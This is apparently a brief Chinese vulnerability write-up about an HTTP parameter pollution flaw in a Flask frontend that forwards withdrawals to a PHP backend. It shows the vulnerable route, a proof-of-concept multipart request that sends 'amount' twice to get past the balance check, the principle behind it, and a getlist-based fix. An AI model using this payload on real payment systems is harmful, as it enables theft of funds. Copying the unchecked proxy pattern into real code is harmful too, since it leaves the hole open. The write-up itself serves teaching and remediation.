前端python flask 后端php

风险代码
@api.route('/withdraw', methods=['POST'])
@isAuthenticated
def withdraw(decoded_token):
    body = request.get_data()
    amount = request.form.get('amount', '')
    account = request.form.get('account', '')
    
    if not amount or not account:
        return response('All fields are required!'), 401
    
    user = getUser(decoded_token.get('username'))

    try:
        if (int(user[0].get('balance')) < int(amount) or int(amount) < 0 ):
            return response('Not enough credits!'), 400

        res = requests.post(f"http://{current_app.config.get('PHP_HOST')}/api/withdraw", 
            headers={"content-type": request.headers.get("content-type")}, data=body)
        
        jsonRes = res.json()

        return response(jsonRes['message'])
    except:
        return response('Only accept number!'), 500


poc:
请求报文数据包中数据修改成
------geckoformboundary8428219cdf9a8efd4366385de1a155cd
Content-Disposition: form-data; name="account"

0xe33255360ca679021edccfe389a67072
------geckoformboundary8428219cdf9a8efd4366385de1a155cd
Content-Disposition: form-data; name="amount"

0
------geckoformboundary8428219cdf9a8efd4366385de1a155cd
Content-Disposition: form-data; name="amount"

1337
------geckoformboundary8428219cdf9a8efd4366385de1a155cd--

原理
字段    	  Flask 读取	       PHP 读取
amount	 取第一个 → 0     取最后一个 → 1337


修复：
使用getlist严格检查输入变量
amounts = request.form.getlist("amount")
if len(amounts) != 1:
    return response("invalid"), 400
amount = amounts[0]

